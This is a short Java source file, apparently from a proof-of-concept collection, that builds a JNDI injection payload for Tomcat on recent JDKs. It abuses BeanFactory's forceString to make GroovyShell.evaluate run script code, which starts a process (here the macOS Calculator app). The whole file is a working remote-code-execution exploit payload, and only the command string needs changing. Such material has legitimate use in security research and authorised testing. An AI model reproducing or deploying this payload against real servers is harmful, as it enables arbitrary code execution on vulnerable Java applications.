package com.xjjlearning.hack.java.highjdk.poc;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/**
 * Created by xjj on 2023/5/6.
 */
public class TomcatGroovyShell implements Payload {

    @Override
    public ResourceRef getPayload() {

//        GroovyShell
//        GroovyShell允许在Java类中（甚至Groovy类）求任意Groovy表达式的值。您可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open', '/System/Applications/Calculator.app']).start()\")"));
        return ref;
    }
}
